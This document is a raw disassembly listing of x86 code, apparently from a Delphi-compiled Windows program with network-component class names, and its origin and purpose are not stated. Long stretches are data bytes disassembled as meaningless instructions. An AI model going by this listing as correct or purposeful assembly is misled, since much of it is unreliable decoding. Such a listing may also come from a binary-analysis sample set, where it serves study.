mov eax [ ebx + 0x70 ]
call sub_404334
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_404334
push eax
mov eax [ ebx + 0x78 ]
call sub_404534
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_404334
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_40386c#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_404334
push eax
mov eax [ ebx + 0x70 ]
call sub_404534
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp [ eax * 4 + sub_465b54 ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_404098
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_465b54
sti
pop esp
inc esi
add [ ebp + 0x5b ] bh
inc esi
add [ ecx - 0x2affb9a5 ] ch
pop ebx
inc esi
add [ ecx ] al
pop esp
inc esi
add [ 0x5900465c ] ch
pop esp
inc esi
add [ edx - 0x54ffb9a4 ] al
pop esp
inc esi
add cl ch
jle r-xdata
add [ ebp - 0x1276b ] cl
jmp [ ecx + rw-data ]
add [ eax ] al
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_404098
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_465dbc
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_4655b0
pop ebx
retn
je r-xdata
call sub_4657d8
jmp r-xdata
pop ebx
retn
sub_465dd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465dfd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e04
retn
sub_465e10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465e35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e3c
retn
sub_465e48
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465e6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e74
retn
sub_465e84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
pop edi
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
pop edi
inc esi
add [ eax + eax ] dh
add [ ebp + ecx * 2 + 0x46 ] cl
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
les esp [ ebp + 0x46 ]
add [ eax ] bl
inc ebp
inc ecx
add [ ebx ] 0x0
or [ ebx + 0x6f ] edx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0x66080041 ] dh
inc esi
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ ebx + 0x3f800046 ] bh
inc esi
add [ eax - 0x17ffb9c1 ] bh
aas
inc esi
add [ eax + 0x4e ] ch
inc esi
add [ eax ] dh
inc esi
add ah al
popad
inc esi
add [ eax - 0x7ffb99d ] ch
arpl [ esi ] ax
sub [ esi + eax * 2 ] ah
xor al 0x64
inc esi
sbb [ ebp + 0x41 ] al
inc eax
pop edi
inc esi
add [ edi ] al
adc dl [ ecx + ecx * 2 + 0x64 ]
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add al 0x0
or [ ebp + 0x73 ] dl
dec esi
popad
insb
lea eax [ eax ]
or [ eax + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc ecx
add [ esi + ebx * 4 + 0x66300041 ] dl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
add [ esp + 0x54120046 ] dh
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc esi
pop esi
inc esi
add [ esi + ecx * 2 ] al
inc esi
add [ 0x64491100 ] al
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a010
mov eax [ r-xdata ]
call sub_463a2c
test al al
je r-xdata
popad
nop
push ebx
mov ebx eax
mov eax ebx
call sub_464e30
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
pushad
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
pushad
inc esi
add [ eax ] cl
add [ eax ] al
pushad
and eax 0x34e80041
inc eax
add al ah
popfd
inc ecx
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
js r-xdata
inc esi
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_463128
mov edi eax
jmp r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
push esp
inc esi
add [ ebp + 0x65340046 ] bl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53090003 ] al
outsd
add [ eax ] bl
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_463418
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_463418
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a038
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41a040
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404334
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4639e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4661a0
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_466050
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4661b6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ca8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466199
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a010
mov eax [ r-xdata ]
call sub_463a2c
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_463128
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_463418
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_463418
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a038
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41a040
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404334
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4639e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4661a0
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_4661c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_466395
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46659c
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_40410c
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46659c
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_40410c
mov eax [ ebp - 0x4 ]
call sub_46659c
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_461814
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_464670
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463ec4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464e34
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_4643c4
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_4040c8
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_464550
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_461cc0
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_463ec4
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_4644e4
mov eax [ r-xdata ]
call sub_463a2c
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4616c8
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_466050
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_466050
pop ecx
mov eax [ ebp - 0x4 ]
call sub_46659c
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_465dbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46639c
lea eax [ ebp - 0x1c ]
call sub_404074
lea eax [ ebp - 0x10 ]
call sub_404074
retn
sub_4663bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_463da0
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4663f8
push ebx
mov ebx eax
mov eax ebx
call sub_464e6c
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_4648bc
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46468c
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_466434
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4664a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_46449c
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4664ab
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4664b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466524
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_4644c0
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46652b
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_466534
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_46659c
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_41a1b4
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_46659c
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d01c
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_46659c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46556c
mov [ ebx + 0x70 ] eax
sub_4665c4
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d01c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_464e3c
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
lea eax [ esi + 0x70 ]
call sub_40d01c
sub_466608
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a400
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_466630
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40386c#4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4616d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a038
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46668a
add [ eax ] eax
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x20004667
add [ eax ] al
add [ ecx ] ch
inc ecx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
pushad
inc eax
add [ esi - 0x76ffb99a ] dl
retn
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
pushad
inc ecx
add [ eax + 0x400415e ] dh
inc cx
add [ edi + ebx * 2 ] dl
inc ecx
add [ 0x66bc0041 ] al
inc ecx
add al dh
add [ esi ] 0x38
pushad
inc ecx
add [ eax ] dh
inc cx
add [ eax - 0x7f ] dl
inc esi
add [ eax ] dh
add [ esi ] 0x10
push esp
dec ecx
dec ebp
popad
outsb
popad
inc edx
jne r-xdata
add [ eax + 0x7e ] bh
inc esi
add [ edi ] cl
push esp
dec ecx
push ebx
imul ebp [ ebp + 0x70 ] 0x7542656c
jb r-xdata
inc esp
movsd [ edi ] [ esi ]
inc ecx
jb r-xdata
inc ecx
add [ eax + 0x400415e ] dh
inc cx
add [ edi + ebx * 2 ] dl
inc ecx
add [ 0x66bc0041 ] al
inc ecx
add [ 0x60380041 ] bh
inc ecx
add [ eax ] dh
inc cx
add ah ah
jge r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
add [ eax ] cl
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc esi
add [ eax ] ch
add [ eax ] al
add ah dh
inc si
add al ch
xor al 0x40
add ah dh
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax + 0x6e ] ch
inc esi
add [ eax - 0x47ffb9c1 ] al
aas
inc esi
add al ch
aas
inc esi
add al ch
outsd
inc esi
add [ esi + esi * 2 + 0x46 ] ch
add ah al
insb
inc esi
add [ ebp + ebp * 2 + 0x46 ] ch
add [ ebp + edi * 2 + 0x7f5c0046 ] cl
inc esi
add [ eax + 0x6e ] al
inc esi
add [ eax - 0x37ffb991 ] dh
jl r-xdata
inc eax
add [ eax + ebp * 2 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
push 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x68
inc esi
add [ eax - 0x48000000 ] bh
cmp al 0x46
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
dec esp
outsd
inc esi
add [ eax ] bl
inc ebp
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0x76a40041 ] dh
inc esi
add [ ebp + 0x41 ] al
add [ eax ] al
add [ eax + 0x4d0d0007 ] al
popad
js r-xdata
jb r-xdata
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ eax + 0x30004670 ] dl
jo r-xdata
arpl [ esi + 0x42 ] si
jne r-xdata
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
jo r-xdata
outsb
dec esp
push 0x3d500046
add ah dh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000c ] al
outsb
push edi
outsd
jb r-xdata
jb r-xdata
cmp al 0x10
inc eax
add [ eax + eax + 0x9cff00 ] bl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or edx [ edx + 0x65 ]
popad
push esp
imul ebp [ ebp + 0x65 ] 0x3c74756f
adc [ eax ] al
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x80
add [ eax ] al
or [ eax ] eax
push cs
push edx
arpl [ gs : esi + 0x42 ] si
add al 0x4e
inc esi
add [ eax + eax ] bh
inc esi
add [ edi ] cl
add [ edi ] cl
add [ eax + 0x3d ] dl
add [ eax - 0x7fffb98d ] ah
jbe r-xdata
imul eax [ esi ] 0xc
add [ eax ] al
add al dh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax 0x54644945
mov esp 0x4000463b
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f0b00
pushad
imul edi [ edx + 0x65 ] r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x8000 ] al
or al [ eax ]
push cs
push ebx
outsb
inc edx
jne r-xdata
dec ecx
push esp
inc ebx
push eax
inc ebx
outsd
outsb
add [ edi + esi * 2 + 0x46 ] al
add al ah
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
outsd
jb r-xdata
inc ebx
push eax
inc ebx
outsd
outsb
outsb
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x15004032 ] dl
inc ebp
dec ecx
push esp
inc edx
imul ebp [ gs : bp + 0x1c ] 0x4800463c
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
or [ 0x6e4f0b00 ] 0x57
jb r-xdata
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x0
add [ eax ] dl
inc eax
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x53 ]
inc ebx
dec ecx
dec ecx
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x464afc72
add [ eax ] bh
add bh bh
fdiv [ esi + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49090004 ] al
outsb
je r-xdata
inc ebx
push eax
inc ebx
add [ eax + 0x7b ] al
inc esi
add [ eax + 0x79 ] bh
inc esi
add [ eax ] dl
push esp
dec ecx
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
in al dx
push 0x10070046
push esp
dec ecx
push esp
mov ah 0x6c
push esp
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
push edi
outsd
jb r-xdata
rcl [ ebx + ebp * 2 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0xc0046 ] dl
add [ eax ] al
in al 0x6a
inc esi
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
